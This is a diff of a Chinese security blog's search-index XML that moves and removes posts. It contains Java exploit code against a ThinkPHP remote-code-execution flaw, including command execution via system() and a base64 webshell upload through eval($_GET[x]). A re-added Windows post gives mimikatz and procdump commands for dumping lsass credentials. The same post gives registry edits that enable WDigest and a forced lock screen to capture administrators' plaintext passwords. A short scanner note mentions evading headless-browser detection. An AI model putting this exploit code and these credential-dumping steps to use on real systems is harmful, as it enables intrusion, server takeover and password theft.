-<h2 id="0x02-写EXP的具体实现"><a href="#0x02-写EXP的具体实现" class="headerlink" title="0x02 写EXP的具体实现"></a>0x02 写EXP的具体实现</h2><h3 id="2-1-checkVul-首先检测漏洞是否存在"><a href="#2-1-checkVul-首先检测漏洞是否存在" class="headerlink" title="2.1 checkVul - 首先检测漏洞是否存在"></a>2.1 checkVul - 首先检测漏洞是否存在</h3><p>Vulhub 也给了payload，方便省事，使用poc打一下,原poc是输出phpinfo,这里改成了输出一串字符<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011812.png" alt="image-20210818213036338"></p>
-<p>转成java,都是最基础的写法</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 检测漏洞是否存在</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">checkVul</span><span class="params">(String url)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = url;</span><br><span class="line">        <span class="comment">// 这里可以通过判断对方是否执行了 md5 计算，输出 202cb962ac59075b964b07152d234b70 来验证漏洞是否存在</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">check_payload</span> <span class="operator">=</span> <span class="string">&quot;/index.php?s=/index/index/name/$&#123;@print(md5(123))&#125;&quot;</span>;</span><br><span class="line">        <span class="comment">// post 请求，根据不同的exp，可能需要不同的请求方式，看需更改，请求方式基本都实现了，若有遗漏，请提交issues</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 使用 src/main/java/fun/fireline/tools/HttpTool.java 工具包中的 get 方法提交</span></span><br><span class="line">            <span class="comment">// 注意 这要用 try  catch 捕获一下异常</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> HttpTool.getHttpReuest(<span class="built_in">this</span>.target + check_payload, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            <span class="comment">// 看回显，是否存在 202cb962ac59075b964b07152d234b70</span></span><br><span class="line">            System.out.println(result);</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> result.contains(<span class="string">&quot;202cb962ac59075b964b07152d234b70&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(flag) &#123;</span><br><span class="line">                <span class="built_in">this</span>.isVul = <span class="literal">true</span>;  <span class="comment">// 存在漏洞</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> flag;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// 输出错误日志</span></span><br><span class="line">            logger.error(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>写完测试一下</p>
-<p>运行<strong>AppStartUp.java</strong>，测试一下</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011828.png" alt="image-20210818224529463"></p>
-<p>成功，而且可以设置代理，走bp，看具体流量</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011837.png" alt="image-20210818224612182"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011844.png" alt="image-20210818224629863"></p>
-<h3 id="2-2-getWebPath-获取网站根目录"><a href="#2-2-getWebPath-获取网站根目录" class="headerlink" title="2.2 getWebPath 获取网站根目录"></a>2.2 getWebPath 获取网站根目录</h3><p>这个写不写都行，这里写一下吧,thinkphp 可以通过<code>realpath(__ROOT__)</code>来获取网站的根路径，改下payload就好</p>
-<p><code>/index.php?s=/index/index/name/$&#123;@print(realpath(__ROOT__))&#125;</code></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取当前的web路径，有最好，没有也无所谓</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getWebPath</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;/index.php?s=/index/index/name/$&#123;@print(realpath(__ROOT__))&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> HttpTool.getHttpReuest(<span class="built_in">this</span>.target + payload, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="comment">// 这个payload会把 html网页也给输出，这里分割简单去除一下</span></span><br><span class="line">        <span class="keyword">return</span> result.split(<span class="string">&quot;&lt;!DOCTYPE html&quot;</span>)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        logger.error(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;命令执行失败&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011857.png" alt="image-20210818230017745"></p>
-<h3 id="2-3-exeCmd-执行命令"><a href="#2-3-exeCmd-执行命令" class="headerlink" title="2.3 exeCmd  执行命令"></a>2.3 exeCmd  执行命令</h3><p>这里先将 <strong>isVul</strong>方法改一下，命令执行依赖于检测，只有检测存在，才能进行命令执行</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isVul</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.isVul;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>Payload <code>/index.php?s=/index/index/name/$&#123;@print(system(whoami))&#125;</code></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 命令执行</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">exeCmd</span><span class="params">(String cmd, String encoding)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;/index.php?s=/index/index/name/$&#123;@print(system(payload))&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 替换payload 中的 payload 字符为要执行的命令</span></span><br><span class="line">        payload = payload.replace(<span class="string">&quot;payload&quot;</span>, cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> HttpTool.getHttpReuest(<span class="built_in">this</span>.target + payload, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> result.split(<span class="string">&quot;&lt;!DOCTYPE html&quot;</span>)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        logger.error(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>测试通过</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011905.png" alt="image-20210818230642660"></p>
-<h3 id="2-4-uploadFile-上传shell"><a href="#2-4-uploadFile-上传shell" class="headerlink" title="2.4 uploadFile 上传shell"></a>2.4 uploadFile 上传shell</h3><p>Payload <code>http://127.0.0.1:8080/index.php?s=/index/index/name/$&#123;$&#123;@eval($_POST[1])&#125;&#125;</code> 这是网上的payload，上传后使用蚁剑连接即可</p>
-<p>虽然，直接使用这个payload也可用，但不方便我们自定义上传的shell马</p>
-<p>@bewhale 师傅的 thinkphp利用工具 <a href="https://github.com/bewhale/thinkphp_gui_tools">https://github.com/bewhale/thinkphp_gui_tools</a> 中使用这个payload来上传文件</p>
-<p><code>/index.php?s=/sd/iex/xxx/$&#123;@eval($_GET[x])&#125;&amp;x=file_put_contents(&#39;bak.php&#39;,base64_decode(&#39;PD9waHAgJGE9In4rZCgpIl4iIXsre30iO0AkYj1iYXNlNjRfZGVjb2RlKCR7JGF9WyJhIl0pO2V2YWwoIiIuJGIpOz8%2B&#39;)); </code></p>
-<p>拿来直接用</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">uploadFile</span><span class="params">(String fileContent, String filename, String platform)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">// 对文件 base64 编码</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64Data</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(fileContent.getBytes());</span><br><span class="line">        <span class="comment">// 注意一下，需要对 base64 编码后的在进行一次url编码，</span></span><br><span class="line">        base64Data = URLEncoder.encode(base64Data, <span class="string">&quot;UTF-8&quot;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;/index.php?s=/sd/iex/xxx/$&#123;@eval($_GET[x])&#125;&amp;x=file_put_contents(&#x27;&quot;</span> + filename + <span class="string">&quot;&#x27;,base64_decode(&#x27;&quot;</span> + base64Data + <span class="string">&quot;&#x27;));&quot;</span>;</span><br><span class="line"></span><br><span class="line">        HttpTool.getHttpReuest(<span class="built_in">this</span>.target + payload, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 上传后，访问一次上传的文件，看返回值是否为200来判断是否上传成功</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">status</span> <span class="operator">=</span> HttpTool.getStatus(<span class="built_in">this</span>.target + <span class="string">&quot;/&quot;</span> + filename);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="built_in">this</span>.target + <span class="string">&quot;/&quot;</span> + filename);</span><br><span class="line">        System.out.println(status);</span><br><span class="line">        <span class="keyword">if</span>(status == <span class="number">200</span>) &#123;</span><br><span class="line">            result = <span class="string">&quot;上传成功! 路径： &quot;</span> + <span class="built_in">this</span>.target + <span class="string">&quot;/&quot;</span> + filename;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result =  <span class="string">&quot;上传失败， 请用这个payload，蚁剑连接试一下 /index.php?s=/index/index/name/$&#123;$&#123;@eval($_POST[1])&#125;&#125;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210819011913.png" alt="image-20210819011430581"></p>
-<p>打完收工</p>
-]]></content>
-      <categories>
-        <category>GitHub工具</category>
-      </categories>
-      <tags>
-        <tag>GitHub工具</tag>
       </tags>
   </entry>
   <entry>
@@ -808,6 +808,57 @@
       </tags>
   </entry>
   <entry>
+    <title>Jie 扫描器</title>
+    <url>/2023/03/06/Jie%20%E6%89%AB%E6%8F%8F%E5%99%A8/</url>
+    <content><![CDATA[<h2 id="劫-开发中-持续更新中"><a href="#劫-开发中-持续更新中" class="headerlink" title="劫(开发中,持续更新中)"></a>劫(开发中,持续更新中)</h2><p>具体漏洞开发详情，请移步 <a href="https://jie.fireline.fun/">https://jie.fireline.fun/</a></p>
+<p>基于浏览器爬虫开发的web漏洞主动 (被动) 扫描器</p>
+<p>由于扫描器只是粗暴的调用 xray、nuclei ，不优雅，而且 xray 不开源，不开源的东西我加入自己的扫描器用着不舒服(纯属给自己挖坑，就当给自己加深漏洞理解了，开发中代码很烂勿喷)。于是产生一个想法，将漏扫类项目拆分出来，重新糅合成一个轮子。</p>
+<p>目前打算设计成两种模式:</p>
+<ul>
+<li>一种被动 优先级低</li>
+<li>一种主动</li>
+</ul>
+<h2 id="已有功能"><a href="#已有功能" class="headerlink" title="已有功能"></a>已有功能</h2><ul>
+<li>Chrome Headless 爬虫, 爬取中进行指纹识别(katana)</li>
+<li>指纹识别，根据指纹识别进行漏洞检测(nuclei)</li>
+<li>基础漏洞扫描 (sql、xss 等) 待优化</li>
+<li>目录扫描(bbscan规则)</li>
+<li><del>一些端口弱口令爆破</del>(这还要在加上端口扫描，先去除)</li>
+</ul>
+<h2 id="语言环境识别"><a href="#语言环境识别" class="headerlink" title="语言环境识别"></a>语言环境识别</h2><p>防止对 php 的网站调用 java 的扫描插件</p>
+<h2 id="插件调用-后期看看有没有必要吧"><a href="#插件调用-后期看看有没有必要吧" class="headerlink" title="插件调用(后期看看有没有必要吧)"></a>插件调用(后期看看有没有必要吧)</h2><p>插件如何调用？ 这里直接放弃，只要代码逻辑写好就行了，后期或者有重构的想法</p>
+<p><del>仿照awvs设计了插件类别</del></p>
+<p><del>PerFile 对每个文件处理,包括文件后面的参数</del></p>
+<p><del>PerFolder 对每个目录处理</del></p>
+<p><del>PerScheme 对每个域名处理</del></p>
+<p><del>PostScan 对Post请求的处理</del></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><h3 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h3><p><a href="https://github.com/projectdiscovery/katana">https://github.com/projectdiscovery/katana</a></p>
+<p>添加了无头浏览器检测绕过 <a href="https://bot.sannysoft.com/">https://bot.sannysoft.com/</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202303062213518.png" alt="BypassHeadlessDetect.png"></p>
+<h3 id="被动扫描代理"><a href="#被动扫描代理" class="headerlink" title="被动扫描代理"></a>被动扫描代理</h3><p><a href="https://github.com/lqqyt2423/go-mitmproxy">https://github.com/lqqyt2423/go-mitmproxy</a></p>
+<h3 id="Xss"><a href="#Xss" class="headerlink" title="Xss"></a>Xss</h3><p><a href="https://github.com/hahwul/dalfox">https://github.com/hahwul/dalfox</a> 什么玩意，发的包也太多了，后续去掉</p>
+<p><a href="https://github.com/ac0d3r/xssfinder">https://github.com/ac0d3r/xssfinder</a></p>
+<p><a href="https://github.com/kleiton0x00/ppmap">https://github.com/kleiton0x00/ppmap</a></p>
+<h3 id="SQL-注入-TODO"><a href="#SQL-注入-TODO" class="headerlink" title="SQL 注入  TODO"></a>SQL 注入  TODO</h3><p>提取 <a href="https://github.com/sqlmapproject/sqlmap">sqlmap</a> 中关于检测的代码，提取一部分思想就行了</p>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>通过指纹识别进行对应的漏洞检测</p>
+<p>todo 不内置 nuclei 的 yml 文件，改为官方在线下载、更新</p>
+<p><a href="https://github.com/projectdiscovery/nuclei">https://github.com/projectdiscovery/nuclei</a></p>
+<p>xray poc  中有些写的不规范，导致解析有问题，需要修改<br>比如：<br>response.status &#x3D;&#x3D; 200 &amp;&amp; response.headers[“content-type”] &#x3D;&#x3D; “text&#x2F;css” &amp;&amp; response.body.bcontains(b”$_GET[‘css’]”)</p>
+<p>content-type 应为 Content-Type</p>
+<p>但又好像是解析有问题</p>
+<p>不使用 xray 的 poc，只使用 nuclei 的 yml 文件<br>一起使用还要整理，防止重复扫描，nuclei-template 的 poc 已经够了</p>
+<h3 id="漏扫"><a href="#漏扫" class="headerlink" title="漏扫"></a>漏扫</h3><p><a href="https://github.com/wrenchonline/glint">https://github.com/wrenchonline/glint</a> 作者设计的我看不懂，自己重来</p>
+<p><a href="https://github.com/veo/vscan">https://github.com/veo/vscan</a>	</p>
+<h3 id="一些其他漏洞"><a href="#一些其他漏洞" class="headerlink" title="一些其他漏洞"></a>一些其他漏洞</h3><h3 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h3><p><a href="https://github.com/a1phaboy/FastjsonScan">https://github.com/a1phaboy/FastjsonScan</a></p>
+]]></content>
+      <categories>
+        <category>开源工具</category>
+      </categories>
+      <tags>
+        <tag>开源工具</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SScan  一款src捡洞扫描器</title>
     <url>/2021/01/11/SScan/</url>
     <content><![CDATA[<h2 id="SScan"><a href="#SScan" class="headerlink" title="SScan"></a>SScan</h2><p><a href="https://github.com/yhy0/SScan/"><img src="https://img.shields.io/badge/python-3.6|3.7|3.8-blue" alt="python"></a></p>
@@ -897,94 +948,10 @@
       </p>
 ]]></content>
       <categories>
-        <category>GitHub工具</category>
+        <category>开源工具</category>
       </categories>
       <tags>
-        <tag>GitHub工具</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows系统散列值获取</title>
-    <url>/2021/02/07/Windows%E7%B3%BB%E7%BB%9F%E6%95%A3%E5%88%97%E5%80%BC%E8%8E%B7%E5%8F%96/</url>
-    <content><![CDATA[<blockquote>
-<p>  明年今日，人生一大喜事(≧∇≦)ﾉ  弱弱问一句我很胖吗？183 165</p>
-</blockquote>
-<h1 id="Windows系统散列值获取"><a href="#Windows系统散列值获取" class="headerlink" title="Windows系统散列值获取"></a>Windows系统散列值获取</h1><h2 id="0x01-LM-Hash与NTLM-Hash"><a href="#0x01-LM-Hash与NTLM-Hash" class="headerlink" title="0x01 LM Hash与NTLM Hash"></a>0x01 LM Hash与NTLM Hash</h2><p>Windows操作系统通常使用两种方法对用户的明文密码进行加密处理。在域环境中，用户信息存储在<code>ntds.dit</code>中，加密后为散列值。</p>
-<p>Windows操作系统中的密码一般由两部分组成，一部分为LM Hash，另一部分为NTLM Hash。在Windows操作系统中，Hash的结构通常如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username:RID:LM-HASH:NT-HASH</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>  LM Hash的全名为”LAN Manager Hash”，是微软为了提高Windows操作系统的安全性而采用的散列值加密算法，其本质是DES加密。尽管LM Hash比较容易破解，但是为了保证系统的兼容性，Windows只是将LM Hash禁用了（从 Windows Vista 和 Windows 2008 版本开始禁用）。如果LM Hash被禁用了，攻击者通过工具抓取的LM Hash值通常是”aad3b435b51404eeaad3b435b51404ee”(表示LM Hash值为空或者被禁用)。</p>
-<p>  NTLM Hash是微软为了在提高安全性的同时保证兼容性而设计的散列加密算法。NTLM Hash是基于MD4加密算法进行加密的。个人版从Windows Vista 以后，服务器版从Windows Server 2003以后，Windows操作系统的认证方式均为NTLM Hash。</p>
-</blockquote>
-<h2 id="0x02-散列值获取方法"><a href="#0x02-散列值获取方法" class="headerlink" title="0x02 散列值获取方法"></a>0x02 散列值获取方法</h2><p>要想在Windows操作系统中抓取散列值或明文密码，必须将权限升级至System。本地用户名，散列值和其它安全验证信息都保存在SAM文件中。lsass.exe进程(它用于本地安全和登陆策略)用于实现Windows的安全策略，可以使用工具将散列值和明文密码从内存中的lsass.exe进程或SAM文件中导出。</p>
-<p>利用前提：拿到了管理员权限的cmd，管理员用密码登录过机器，并运行了lsass.exe进程，把密码保存在内存文件lsass进程中。</p>
-<p>在<strong>KB2871997</strong>之前， 使用 Mimikatz 可以直接抓取明文密码。</p>
-<p>当服务器安装 <strong>KB2871997</strong> 补丁后，系统默认禁用 Wdigest Auth（<strong>Windows 2012及以上版本</strong>） ，内存（lsass进程）不再保存明文口令。Mimikatz 将读不到密码明文。<br>    但由于一些系统服务需要用到 Wdigest Auth，所以该选项是可以手动开启的。（开启后，需要用户重新登录才能生效）之后通过手工修改注册表 + 强制锁屏 + 等待目标系统管理员重新登录 &#x3D; 截取明文密码</p>
-<h3 id="使用mimikatz在线读取SAM文件（目标没有杀软，或者mimikatz已免杀）"><a href="#使用mimikatz在线读取SAM文件（目标没有杀软，或者mimikatz已免杀）" class="headerlink" title="使用mimikatz在线读取SAM文件（目标没有杀软，或者mimikatz已免杀）"></a>使用mimikatz在线读取SAM文件（目标没有杀软，或者<code>mimikatz</code>已免杀）</h3><p>直接将<code>mimikatz</code>上传至目标机器</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;    #在线读取散列值及铭文密码</span><br></pre></td></tr></table></figure>
-
-<p>该操作需要管理员权限，否则报错，无法读取密码，报错信息如下</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210207221939.png" alt="image-20210207221937863"></p>
-<p>管理员权限执行</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210207221945.png" alt="image-20210207221846491"></p>
-<h4 id="使用mimikatz离线读取lsass-dmp文件（mimikatz被杀软拦截）"><a href="#使用mimikatz离线读取lsass-dmp文件（mimikatz被杀软拦截）" class="headerlink" title="使用mimikatz离线读取lsass.dmp文件（mimikatz被杀软拦截）"></a>使用mimikatz离线读取lsass.dmp文件（mimikatz被杀软拦截）</h4><p>（1）导出<code>lsass.dmp</code>文件</p>
-<p>通过 <code>procdump.exe</code> 文件导出<code>lsass.dmp</code>文件（Procdump是微软官方发布的工具，可以在命令行下将目标lsass文件导出，且杀毒软件不会拦截）</p>
-<p><code>procdump</code>下载地址：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a></p>
-<p><strong>管理员权限运行</strong>该命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210207215155.png" alt="image-20210207214123607"></p>
-<p>(2）使用mimikatz导出lsass.dmp文件中的密码散列值</p>
-<p>将目标机器上的 <code>lsass.tmp</code> 拉取到本地，与<code>mimikatz</code>同目录，使用<code>mimikatz</code>解密目标系统密码。（本地机器需与目标机器的版本位数一致）</p>
-<p>运行mimikatz.exe 解密该文件。注：32位就用32位的<code>mimikatz</code>破解，同理64位的也是。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210207213854.png" alt="image-20210207213852318"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210207214737.png" alt="image-20210207214733408"></p>
-<h4 id="mimikatz无法读取到密码时"><a href="#mimikatz无法读取到密码时" class="headerlink" title="mimikatz无法读取到密码时"></a>mimikatz无法读取到密码时</h4><p>在默认情况下，当系统为<strong>Windows 2012R2</strong>以上或者安装 <strong>KB2871997</strong> 补丁时，默认在内存缓存中禁止保存明文密码，密码字段显示为null，此时可以通过以下方式开启，但需要用户重新登录后才能成功抓取。</p>
-<p><strong>开启Wdigest Auth</strong></p>
-<ul>
-<li><p>cmd</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>powershell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>meterpreter</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1</span><br></pre></td></tr></table></figure></li>
-</ul>
-<p><strong>关闭Wdigest Auth</strong></p>
-<p>关闭命令如下：</p>
-<ul>
-<li><p>cmd</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>powershell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>meterpreter</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 0</span><br></pre></td></tr></table></figure></li>
-</ul>
-<p><strong>强制锁屏</strong></p>
-<p>在开启 <code>Wdigest Auth</code> 后，需要管理员重新登录才能抓明文密码。</p>
-<p>强制锁屏，让管理员重新登录。</p>
-<ul>
-<li><p>cmd</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rundll32 user32.dll,LockWorkStation</span><br></pre></td></tr></table></figure>
-
-<p>等待管理员重新登录，之后重新读取，可读到明文密码。</p>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>域渗透</category>
-      </categories>
-      <tags>
-        <tag>Windows提权</tag>
-        <tag>域渗透</tag>
+        <tag>开源工具</tag>
       </tags>
   </entry>
   <entry>
@@ -1088,6 +1055,90 @@
       </tags>
   </entry>
   <entry>
+    <title>Windows系统散列值获取</title>
+    <url>/2021/02/07/Windows%E7%B3%BB%E7%BB%9F%E6%95%A3%E5%88%97%E5%80%BC%E8%8E%B7%E5%8F%96/</url>
+    <content><![CDATA[<blockquote>
+<p>  明年今日，人生一大喜事(≧∇≦)ﾉ  弱弱问一句我很胖吗？183 165</p>
+</blockquote>
+<h1 id="Windows系统散列值获取"><a href="#Windows系统散列值获取" class="headerlink" title="Windows系统散列值获取"></a>Windows系统散列值获取</h1><h2 id="0x01-LM-Hash与NTLM-Hash"><a href="#0x01-LM-Hash与NTLM-Hash" class="headerlink" title="0x01 LM Hash与NTLM Hash"></a>0x01 LM Hash与NTLM Hash</h2><p>Windows操作系统通常使用两种方法对用户的明文密码进行加密处理。在域环境中，用户信息存储在<code>ntds.dit</code>中，加密后为散列值。</p>
+<p>Windows操作系统中的密码一般由两部分组成，一部分为LM Hash，另一部分为NTLM Hash。在Windows操作系统中，Hash的结构通常如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username:RID:LM-HASH:NT-HASH</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>  LM Hash的全名为”LAN Manager Hash”，是微软为了提高Windows操作系统的安全性而采用的散列值加密算法，其本质是DES加密。尽管LM Hash比较容易破解，但是为了保证系统的兼容性，Windows只是将LM Hash禁用了（从 Windows Vista 和 Windows 2008 版本开始禁用）。如果LM Hash被禁用了，攻击者通过工具抓取的LM Hash值通常是”aad3b435b51404eeaad3b435b51404ee”(表示LM Hash值为空或者被禁用)。</p>
+<p>  NTLM Hash是微软为了在提高安全性的同时保证兼容性而设计的散列加密算法。NTLM Hash是基于MD4加密算法进行加密的。个人版从Windows Vista 以后，服务器版从Windows Server 2003以后，Windows操作系统的认证方式均为NTLM Hash。</p>
+</blockquote>
+<h2 id="0x02-散列值获取方法"><a href="#0x02-散列值获取方法" class="headerlink" title="0x02 散列值获取方法"></a>0x02 散列值获取方法</h2><p>要想在Windows操作系统中抓取散列值或明文密码，必须将权限升级至System。本地用户名，散列值和其它安全验证信息都保存在SAM文件中。lsass.exe进程(它用于本地安全和登陆策略)用于实现Windows的安全策略，可以使用工具将散列值和明文密码从内存中的lsass.exe进程或SAM文件中导出。</p>
+<p>利用前提：拿到了管理员权限的cmd，管理员用密码登录过机器，并运行了lsass.exe进程，把密码保存在内存文件lsass进程中。</p>
+<p>在<strong>KB2871997</strong>之前， 使用 Mimikatz 可以直接抓取明文密码。</p>
+<p>当服务器安装 <strong>KB2871997</strong> 补丁后，系统默认禁用 Wdigest Auth（<strong>Windows 2012及以上版本</strong>） ，内存（lsass进程）不再保存明文口令。Mimikatz 将读不到密码明文。<br>    但由于一些系统服务需要用到 Wdigest Auth，所以该选项是可以手动开启的。（开启后，需要用户重新登录才能生效）之后通过手工修改注册表 + 强制锁屏 + 等待目标系统管理员重新登录 &#x3D; 截取明文密码</p>
+<h3 id="使用mimikatz在线读取SAM文件（目标没有杀软，或者mimikatz已免杀）"><a href="#使用mimikatz在线读取SAM文件（目标没有杀软，或者mimikatz已免杀）" class="headerlink" title="使用mimikatz在线读取SAM文件（目标没有杀软，或者mimikatz已免杀）"></a>使用mimikatz在线读取SAM文件（目标没有杀软，或者<code>mimikatz</code>已免杀）</h3><p>直接将<code>mimikatz</code>上传至目标机器</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;    #在线读取散列值及铭文密码</span><br></pre></td></tr></table></figure>
+
+<p>该操作需要管理员权限，否则报错，无法读取密码，报错信息如下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210207221939.png" alt="image-20210207221937863"></p>
+<p>管理员权限执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210207221945.png" alt="image-20210207221846491"></p>
